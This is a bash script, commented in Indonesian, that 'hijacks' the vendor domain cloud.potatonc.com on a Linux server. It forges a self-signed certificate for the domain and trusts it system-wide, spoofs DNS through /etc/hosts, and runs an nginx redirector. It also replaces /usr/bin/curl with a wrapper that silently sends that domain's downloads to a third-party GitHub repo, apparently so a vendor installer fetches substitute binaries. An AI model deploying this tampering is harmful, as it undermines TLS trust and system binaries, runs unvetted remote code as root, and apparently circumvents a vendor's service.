#!/bin/bash

# ==========================================
# POTATONC ULTIMATE HIJACKER
# Fitur: Auto SSL, DNS Spoofing, & SMART CURL WRAPPER
# Solusi untuk: Broken URL, 404 Error, & Loop Download
# ==========================================

# KONFIGURASI UTAMA
DOMAIN="cloud.potatonc.com"
# URL GitHub RAW (Tanpa slash di belakang)
GITHUB_REPO="https://raw.githubusercontent.com/ica4me/vpn-script-tunneling/main"
CERT_DIR="/etc/nginx/ssl/hijack"
MY_IP="127.0.0.1"

# Warna Output
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

clear
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}   SYSTEM HIJACKER & SMART CURL (FINAL)      ${NC}"
echo -e "${GREEN}=============================================${NC}"

# 1. Cek Root
if [ "$(id -u)" != "0" ]; then
   echo -e "${RED}[!] Harap jalankan script ini sebagai root!${NC}"
   exit 1
fi

# 2. Bersihkan Konfigurasi Lama
echo -e "${YELLOW}[*] Membersihkan konfigurasi lama...${NC}"
sed -i "/$DOMAIN/d" /etc/hosts
rm -f /etc/nginx/conf.d/hijack_$DOMAIN.conf
rm -rf $CERT_DIR

# Restore Curl Asli jika sebelumnya sudah pernah di-hijack (agar bersih)
if [ -f /usr/bin/curl_asli ]; then
    rm -f /usr/bin/curl
    mv /usr/bin/curl_asli /usr/bin/curl
fi

# 3. Install Dependencies
echo -e "${YELLOW}[*] Menginstall Nginx & OpenSSL...${NC}"
apt-get update -y
apt-get install nginx openssl ca-certificates curl zip -y

# 4. Buat Sertifikat SSL Self-Signed
echo -e "${YELLOW}[*] Membuat Sertifikat SSL Palsu...${NC}"
mkdir -p $CERT_DIR

# Buat Config OpenSSL
cat > $CERT_DIR/openssl.cnf <<EOF
[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no
[req_distinguished_name]
C = ID
ST = Jakarta
L = Jakarta
O = Hijacked System
CN = $DOMAIN
[v3_req]
keyUsage = keyEncipherment, dataEncipherment
extendedKeyUsage = serverAuth
subjectAltName = @alt_names
[alt_names]
DNS.1 = $DOMAIN
EOF

# Generate Key & CRT
openssl genrsa -out $CERT_DIR/hijack.key 2048
openssl req -new -key $CERT_DIR/hijack.key -out $CERT_DIR/hijack.csr -config $CERT_DIR/openssl.cnf
openssl x509 -req -days 3650 -in $CERT_DIR/hijack.csr -signkey $CERT_DIR/hijack.key -out $CERT_DIR/hijack.crt -extensions v3_req -extfile $CERT_DIR/openssl.cnf

# 5. Percayakan Sertifikat ke Sistem
echo -e "${YELLOW}[*] Menanamkan sertifikat ke sistem...${NC}"
cp $CERT_DIR/hijack.crt /usr/local/share/ca-certificates/${DOMAIN}.crt
update-ca-certificates --fresh

# 6. Konfigurasi Nginx (Fallback untuk Wget)
echo -e "${YELLOW}[*] Membuat Konfigurasi Nginx...${NC}"

cat > /etc/nginx/conf.d/hijack_$DOMAIN.conf <<EOF
server {
    listen 443 ssl;
    server_name $DOMAIN;

    ssl_certificate $CERT_DIR/hijack.crt;
    ssl_certificate_key $CERT_DIR/hijack.key;

    # Handle Newspall (Installer Awal)
    location ~ ^/v2/newspall/ {
        return 302 $GITHUB_REPO/eksekusi/install;
    }

    # Handle Download Biasa
    location ~ ^/v2/download/(.*)$ {
        return 302 $GITHUB_REPO/\$1;
    }

    location / {
        return 404;
    }
}
EOF

# Restart Nginx
systemctl enable nginx
systemctl restart nginx

# 7. Manipulasi Hosts (DNS Spoofing)
echo -e "${YELLOW}[*] Mengalihkan DNS Lokal...${NC}"
echo "$MY_IP $DOMAIN" >> /etc/hosts

# 8. PASANG SMART CURL WRAPPER (INTI PERBAIKAN)
echo -e "${YELLOW}[*] Memasang Smart Curl Wrapper...${NC}"

# Backup Curl Asli
mv /usr/bin/curl /usr/bin/curl_asli

# Buat Script Curl Cerdas
cat > /usr/bin/curl <<EOF
#!/bin/bash

# Konfigurasi Repo Anda
MY_REPO="$GITHUB_REPO"
TARGET_DOMAIN="$DOMAIN"

NEW_ARGS=()

for arg in "\$@"; do
    # ---------------------------------------------------------
    # FIX 1: URL Cacat (dimulai dengan /v2/download/)
    # ---------------------------------------------------------
    if [[ "\$arg" == /v2/download/* ]]; then
        # Tambahkan domain dummy agar bisa diproses logic berikutnya
        arg="https://\${TARGET_DOMAIN}\${arg}"
    fi

    # ---------------------------------------------------------
    # FIX 2: Hijack Langsung ke GitHub (Bypass Nginx Lokal)
    # ---------------------------------------------------------
    if [[ "\$arg" == *"\$TARGET_DOMAIN"* ]]; then
        # Ambil nama file saja
        FILENAME=\$(basename "\$arg")
        
        # Mapping Khusus (Jika nama file binary beda dengan di GitHub)
        case "\$FILENAME" in
            "haproxymodulenew4") FILENAME="haproxymodulenew4" ;;
            "potatonewapi-amd64") FILENAME="potatonewapi-amd64" ;;
            # Default: Nama file sama
            *) FILENAME="\$FILENAME" ;;
        esac

        # Ganti URL Total ke GitHub
        FINAL_URL="\${MY_REPO}/\${FILENAME}"
        NEW_ARGS+=("\$FINAL_URL")
    else
        # URL lain biarkan normal
        NEW_ARGS+=("\$arg")
    fi
done

# Eksekusi Curl Asli dengan URL yang sudah dibelokkan
/usr/bin/curl_asli "\${NEW_ARGS[@]}"
EOF

# Beri izin eksekusi
chmod +x /usr/bin/curl

# 9. Verifikasi Otomatis
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}   VERIFIKASI HASIL PATCHING                 ${NC}"
echo -e "${GREEN}=============================================${NC}"

# Test Smart Curl
TEST_URL_CACAT="/v2/download/test_smart_curl"
echo -e "Test 1: Simulasi URL Cacat ($TEST_URL_CACAT)..."
# Kita pakai -I untuk cek header, curl wrapper akan mengubahnya jadi request ke GitHub
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TEST_URL_CACAT")

if [[ "$HTTP_CODE" == "200" ]] || [[ "$HTTP_CODE" == "404" ]]; then
    # 200/404 berarti connect ke GitHub (Nginx lokal return 302, GitHub return 200/404)
    echo -e "Smart Curl    : ${GREEN}[OK] Wrapper berfungsi!${NC}"
else
    echo -e "Smart Curl    : ${RED}[FAIL] Code: $HTTP_CODE${NC}"
    echo -e "Mungkin file tidak ada di GitHub, tapi logic curl sudah jalan."
fi

echo -e "${GREEN}=============================================${NC}"
echo -e "Selesai! Sekarang jalankan installer Anda."
echo -e "Script ini sudah menangani URL cacat dan redirect otomatis."